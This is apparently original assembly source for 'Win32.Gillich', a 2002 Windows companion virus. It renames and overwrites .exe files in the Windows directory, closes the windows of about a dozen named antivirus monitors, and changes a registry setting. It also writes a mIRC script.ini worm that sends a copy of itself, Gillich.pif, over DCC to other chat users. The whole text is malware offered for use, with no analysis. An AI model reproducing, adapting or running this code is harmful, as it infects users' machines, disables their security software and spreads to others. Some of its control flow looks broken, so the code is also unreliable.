comment $
####################################
############ Win32.Gillich #########
####################################
##(c)by Necronomikon [Zer0Gravity]##
####################################
Note:This virus was written for 4 of 
my friends,who died in an car accident!
 + 02.jan.2002
--------------------------------------------
Features:
--------------
Companionvirus with:
- mIRC-Worm
- Anti AV-Monitor
---------------------------------------------
$
.386p
.model flat
.data
;Text for msgboxes
first_text    db "This piece of code was written for,",13,10
              db "4 of my friends,who died in a car accident!",13,10
              db "Its very terrible,isn´t it?",0

goon_text    db "Thanks for your condolence!",13,10
             db "Have a nice day....",0

no_text     db "Are you any kind of bastard?",13,10
            db "It was your fault!!!",13,10
            db "Bye,bye...",0

reg_text   db "Tuning option started...",0
fuck_cap   db "Damn",0
fuck_text  db "Tuning Failed!!!?",0
titel      db "*Win32.Gillich*",0
;Registry codez
KEY_ALL_ACCESS    = 001F0000h
HKEY_CURRENT_USER = 80000001h
REG_DWORD         = 00000004h
value_name DB "MenuShowDelay",0
subkey DB "Control Panel\Desktop",0
disposition DD ?
new_value DD 10000d   
reghandle DD ?
handle1     db  50  dup(0)
handle2     db  50  dup(0)
maska       db  '*.exe',0
zgrext      db  'zgr',0
handle_     dd  0
_handle     dd  0
filedta:
FindWindow        dd            0
PostMessage       dd            0
FileAttributes  dd  0
CreationTime    db  8   dup(0)
LastAccessTime  db  8   dup(0)
LastWriteTime   db  8   dup(0)
nFileSizeHigh   dd  0
nFileSizeLow    dd  0
dwReserved0 dd  0
dwReserved1 dd  0
WriteFile                dd          (?)
nFileName   db  50  dup('N')
nAltFileName    db  14  dup(0)
newfilename db  50  dup(0)
path2       db  25  dup(0)
path3       db  260 dup(0)
MircLNK     db  'Startm~1\Progra~1\mIRC\mIRC32.LNK',0
MircDir     db  50  dup(0)
MircIni     db  '\script.ini',0
Mirc_       db  'c:\mirc\script.ini',0

extrn   MessageBoxA:proc;
extrn   GetSystemDirectoryA:proc;
extrn   GetWindowsDirectoryA:proc;
extrn   lstrcat:proc;
extrn   ExitProcess:proc;
extrn   GetModuleHandleA:proc;
extrn   GetModuleFileNameA:proc;
extrn   FindFirstFileA:proc;
extrn   FindNextFileA:proc;
extrn   FindWindowA:proc;
extrn   RegCreateKeyExA:proc;
extrn   RegCloseKey:proc;
extrn   RegSetValueExA:proc;
extrn   CopyFileA:proc;
extrn   DeleteFileA:proc;
extrn   MoveFileA:proc;
extrn   CreateFileA:proc;
extrn   _lclose:proc;
extrn   PostMessageA:proc;
extrn   WinExec:proc;
extrn   SetFilePointer:proc;
extrn   GetCurrentDirectoryA:proc;
extrn   SetCurrentDirectory:proc;
extrn   _lread:proc;
extrn   _lcreat:proc;
extrn   SetCurrentDirectoryA:proc;

;include files
include win32.inc
lpFuck    equ  offset  fuck_text
lpFuckCap  equ  offset  fuck_cap
_off_   equ 2722d
lpReg   equ  offset   reg_text
_scrpt_ equ offset end_script - offset script
mb_yesno       equ 4
mb_ok          equ 0
hWnd           equ 0
lpText         equ offset first_text
lpCaption      equ offset titel

.Code
allthecode:
startgame:
push mb_yesno
push lpCaption
push lpText
push hWnd
call MessageBoxA
cmp  eax, 6
je  goon
jmp no

real:
push    00000001
push    offset nFileName
call    WinExec

push    offset path3
push    260
call    GetCurrentDirectoryA

push    25
push    offset path2
call    GetWindowsDirectoryA

push    offset path2
call    SetCurrentDirectoryA

push    offset  handle1
call    GetModuleHandleA

push    50
push    offset handle2
push    eax
call    GetModuleFileNameA

push    offset filedta
push    offset maska
call    FindFirstFileA

mov dword ptr [handle_],eax
cmp eax,    0
je  GameOver

check:
mov bx, word ptr[nFileName]
cmp bx, 'NE'
je  nextfile
cmp bx, 'ZG'
je  nextfile
cmp bx, 'zg'
je  nextfile
cmp bx, 'MC'
je  nextfile
lea esi,    [nFileName]
lea edi,    [newfilename]

stowit:
lodsb
cmp al, '.'
je  addext
stosb
jmp stowit

goon:
push mb_ok
push lpCaption
push offset goon_text
push hWnd
call MessageBoxA
jmp bailout

no:  push mb_ok
push lpCaption
push offset no_text
push hWnd
call MessageBoxA
jmp tuneup

addext:
stosb
lea esi,    [zgrext]
movsw
movsw
push    0
push    offset newfilename
push    offset nFileName
call    MoveFileA

push    0
push    offset nFileName
push    offset handle2
call    CopyFileA

push    2
push    offset nFileName
call    CreateFileA

mov dword ptr [_handle],eax

push    dword 0
push       0
push    _off_
push    eax
call    SetFilePointer

mov eax,    dword ptr [_handle]

push    50
push    offset newfilename
push    eax
call    WriteFile

push    eax
call    _lclose
jmp nextfile
je real
;Kill some AV-Monitors
;Thanks to DX100h for lil Help!:)
wavp    db  'AVP Monitor',0         ;window title(AVP)
wika    db 'IKARUS Guard9x',0       ;Ikarus av
wmca    db 'MCAfee VShield',0       ;McAfee
wnom    db 'CLAW95',0               ; Norman Virus Control
wsol    db 'SCAN32',0               ; DR-Solomon
wpro    db 'FP-WIN',0               ; F-Prot
winn    db 'VET95',0                ; InnoculateIT
wnor    db 'NAVAPW32',0             ; Norton
wsop    db 'SWEEP95',0              ; Sophos 
wpcc    db 'IOMON98',0              ; PC-Cillin
wrav    db 'MONITOR',0              ; RAV

xor ecx,ecx
avp:
mov eax,offset wavp ;Avp
jmp execute

norton:
mov eax,offset wnor ;norton
jmp execute

mcafee:
mov eax,offset wmca ;Mcafee
jmp execute

pccil:
mov eax,offset wpcc ;PcCillin
jmp execute

ikarus:
mov eax,offset wika ;Ikarus
jmp execute

norman:
mov eax,offset wnom ;Norman Virus Control
jmp execute

solomon:
mov eax,offset wsol ;dr.solomon
jmp execute

fprot:
mov eax,offset wpro ;f-prot
jmp execute

inn:
mov eax,offset winn ;InnoculateIT
jmp execute

sop:
mov eax,offset wsop ;Sophos
jmp execute

rav:
mov eax,offset wrav ;RAV
jmp execute

Killav:
xor eax,eax
xor ecx,ecx
jmp execute

execute:
push eax
push 00000000h
call FindWindow
cmp eax,0
je quit
push 00000000h
push 00000000h
push 00000012h
push eax
call PostMessage
inc ecx
cmp ecx,1
je norton
cmp ecx,2
je mcafee
cmp ecx,3
je pccil
cmp ecx,4
je ikarus
cmp ecx,5
je norman
cmp ecx,6
je solomon
cmp ecx,7
je fprot
cmp ecx,8
je inn
cmp ecx,9
je sop
cmp ecx,10
je rav
cmp ecx,11
je avp

cmp ecx,11
je Killav
quit:
jmp real ;the rest of the code



tuneup:
;*********************************************
;*this piece of code is taken(translated)    *
;*from my Word97/2K.Blade Macrovirus by me!;)*
;*********************************************
;thanks to Eddow & Malfuntion for lil help 
xor eax,eax
push offset disposition
push offset reghandle
push eax
push KEY_ALL_ACCESS
push eax
push eax
push eax
push offset subkey
push HKEY_CURRENT_USER
call RegCreateKeyExA
test eax,eax
jnz fuckup

push 4
push offset new_value
push REG_DWORD
push 0
push offset value_name
push reghandle
call RegSetValueExA

push reghandle
call RegCloseKey

push 0 
push mb_ok
push lpCaption
push offset lpReg
push hWnd
call MessageBoxA
jmp real 
fuckup: 
push 0 
push mb_ok
push lpFuckCap
push offset lpFuck
push hWnd
call MessageBoxA
jmp bailout

nextfile:

    push    offset filedta
    mov eax,    dword ptr [handle_]
    push    eax
    call    FindNextFileA
    cmp eax,    0
    je  GameOver
    jmp check

script:
db '[script]',0dh,0ah
db 'n0=; IRC_Worm/Gillich (c)by Necronomikon[Zer0Gravity]',0dh,0ah
db 'n1=/titlebar -=InMemories for4of myFriends who died in 1CarAccident!+02.Jan.2002=-',0dh,0ah
db 'n2=on 1:start:{',0dh,0ah
db 'n3=  /if $day == Friday { /echo  }',0dh,0ah
db 'n4=on 1:Join:#:if $chan = #vxers /part $chan',0dh,0ah
db 'n5=on 1:connect:.msg Necronomi -=I am infected with ur stuff!!!=-',0dh,0ah
db 'n6=on 1:text:#:*hi*:/say $chan kick me',0dh,0ah
db 'n7=on 1:text:#:*hello*:/say $chan kick me',0dh,0ah    
db 'n8=on 1:part:#:{',0dh,0ah
db 'n9=  if $nick != $me {',0dh,0ah
db 'n10=    /quit $nick Rest in peace L.+N.Gillich',0dh,0ah
db 'n11=    /msg $nick Hope you like it!?',0dh,0ah
db 'n12=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }',0dh,0ah
db 'n13=  /dcc send $nick '
db 'n14=  }',0dh,0ah
db 'n15=}',0
path1       db  25  dup(0)
handle3     db  '\Gillich.pif',0,'}'
        db  100 dup(0)
end_script: 

GameOver:

    push    25
    push    offset path1
    call    GetSystemDirectoryA

    push    offset handle3
    push    offset path1
    call    lstrcat

    push    0
    push    offset path1
    push    offset handle2
    call    CopyFileA

    push    2
    push    offset MircLNK  
    call    CreateFileA

    mov dword ptr [_handle],eax
    push    dword 2
                push        0
    push    -50
    push    eax
    call    SetFilePointer
    mov eax,    dword ptr [_handle]

    push    50
    push    offset  MircDir
    push    eax
    call    _lread

    push    eax
    call    _lclose

    std
    lea esi,    MircIni

get_next_byte:
    lodsb
    cmp al, ':'
    jne get_next_byte

    push    offset MircIni
    push    esi
    call    lstrcat

    push    0
    push    esi
    call    CreateFileA

    push    _scrpt_
    push    offset script
    push    eax
    call    WriteFile

    push    eax
    call    _lclose

    push    offset path3
    call    SetCurrentDirectoryA

bailout:    
push    0
    call    ExitProcess


end allthecode








